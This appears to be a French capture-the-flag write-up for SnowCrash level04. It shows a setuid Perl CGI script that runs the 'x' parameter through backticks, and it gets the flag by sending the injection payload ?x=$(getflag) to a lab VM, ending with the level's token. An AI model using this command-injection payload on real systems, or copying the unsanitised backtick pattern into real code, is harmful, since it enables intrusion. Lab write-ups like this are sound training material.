```bash
level04@SnowCrash:~$ ls -la
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
```

Il s'agit d'un fichier perl [Wikipedia](https://fr.wikipedia.org/wiki/Perl_(langage)).

level04.pl:

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

On fait des recherches pour comprendre ce que fais exactement ce fichier:

[CGI](https://perl.mines-albi.fr/ModulesFr/CGI.html) qui gere les parametres dans une requete.

On essaye de metre notre IP dans notre navigateur internet et on arrive bien a atteindre notre machine.
```
It works!

This is the default web page for this server.

The web server software is running but no content has been added, yet.
```

Nous pouvons voir egalement que pour le localhost on utilise le 4747

```perl
# localhost:4747
```

On essaye donc `http://192.168.1.74:4747/` => Page blanche.

On essaye d'eploiter le parametre "x" => `http://192.168.1.74:4747/?x=getflag`
getflag est affiche dans le navigateur, si on mets "toto" ca affiche... "toto" :)

On essaye d'afficher le PATH pour voir si on peut exploiter plus en profondeur le script
`http://192.168.1.74:4747/?x=$PATH` => `/usr/local/bin:/usr/bin:/bin` dans le navigateur

On essaye d'executer `getflag` depuis le navigateur: `http://192.168.1.74:4747/?x=$(getflag)` et on obtient le flag :D

Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap 